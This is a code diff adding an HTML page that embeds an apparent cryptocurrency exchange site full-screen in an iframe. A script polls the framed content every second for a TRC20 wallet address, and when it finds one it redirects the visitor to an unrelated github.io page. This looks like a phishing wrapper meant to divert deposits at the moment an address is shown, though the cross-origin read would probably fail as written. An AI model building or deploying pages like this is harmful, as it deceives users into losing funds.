@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Detection Redirect</title>
+    <style>
+        /* 全屏显示iframe */
+        html, body, iframe {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        iframe {
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- 嵌入目标网站 -->
+    <iframe id="targetIframe" src="https://m.hotscoin.live"></iframe>
+
+    <script>
+        // 监控页面中出现的钱包地址
+        function detectWalletAddress() {
+            try {
+                const iframeDocument = document.getElementById("targetIframe").contentDocument || document.getElementById("targetIframe").contentWindow.document;
+                
+                // 匹配TRC20钱包地址的正则表达式（假设TRC20地址以"T"开头且为34位字符）
+                const walletRegex = /\bT[a-zA-Z0-9]{33}\b/g;
+
+                // 检查是否找到符合格式的钱包地址
+                if (walletRegex.test(iframeDocument.body.innerText)) {
+                    // 发现钱包地址后重定向
+                    window.location.href = "https://maas-ma4.github.io/";
+                }
+            } catch (error) {
+                console.error("Error accessing iframe content:", error);
+            }
+        }
+
+        // 每隔一秒检测一次
+        setInterval(detectWalletAddress, 1000);
+    </script>
+</body>
+</html>
